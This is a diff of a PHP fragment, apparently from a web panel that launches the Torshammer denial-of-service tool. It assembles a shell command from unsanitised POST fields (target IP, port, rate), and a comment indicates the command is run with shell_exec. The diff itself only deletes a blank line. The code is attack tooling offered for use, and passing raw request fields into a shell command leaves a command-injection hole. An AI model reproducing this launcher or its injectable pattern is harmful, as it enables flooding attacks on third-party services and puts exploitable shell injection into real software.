@@ -1,5 +1,4 @@
 <?php
-
   // Use ls command to shell_exec
   // function
   $DDOS = 'python2 scripts/Torshammer/torshammer.py -t'." ".$_POST['IP']." ".'-p'." ".$_POST['PORT']." ".'-r'." ".$_POST['RE'];
